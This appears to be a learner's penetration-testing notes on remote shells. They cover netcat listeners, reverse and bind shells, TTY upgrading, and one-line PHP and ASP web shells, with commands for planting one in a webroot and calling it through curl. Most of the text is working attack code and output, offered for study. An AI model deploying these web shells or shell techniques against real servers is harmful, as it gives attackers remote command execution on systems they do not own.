### Reverse Shell
* Most common type of shell
	* Quick and easy
* Use netcat to listen for the connection coming from the victim

#### Netcat Listener
* Start `netcat` listener on a port of our choosing

```bash
# -l Listen mode, to wait for a connection to connect to us.
# -v Verbose mode, so that we know when we receive a connection.
# -n Disable DNS resolution and only connect from/to IPs, to speed up the connection.
# -p 1234 Port number `netcat` is listening on, and the reverse connection should be sent to.
$ nc -lvnp 1234

listening on [any] 1234 ...
```

#### Reverse Shell Command
* Command depends on host OS
* Connection comes from the victim to us
* [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) has a list of reverse shells or different use cases
* Used when we want a quick reliable connection
* However reverse shells are very fragile when losing the connection or canceling a command

```bash
$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Bind Shell
* Like a reverse shell, but we have to connect to the targets' listening port

```bash
$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* Unlike a reverse shell, we drop the connection, we can just connect back via netcat
* However if the remote host reboots or the connection is stopped or any reason we lose our access

#### Upgrading TTY
* Multiple methods

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ ^Z

$ stty raw -echo
$ fg

[Enter]
[Enter]
www-data@remotehost$
```

* Further, upgrade the shell to enable all features just like an SSH connection

```bash
# In a new terminal window
$ echo $TERM
xterm-256color
$ stty size
67 318

# Back in netcat
$ export TERM=xterm-256color
$ stty rows 67 columns 318
```

#### Web Shell
* Typically a web script i.e `php` or `ASPX` that accepts our command trough HTTP requests
	* `GET` or `POST`
	* Prints output back to web page
*  Common shell scripts

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<%                                                         %>
```

```asp
<% eval request("cmd") %>
```

#### Uploading a Web Shell
* Place the script into the remote host's directory (webroot)

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| Apache     | /var/www/html/         |
| Nginx      | /usr/local/nginx/html/ |
| IIS        | C:\inetpub\wwwroot\    |
| XAMPP      | C:\xampp\htdocs\       |

* Apache example

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Accessing Web Shell
* We can open the file via a browser or `cURL`
* We provide our commands via the get parameter `?cmd=`

```bash
$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
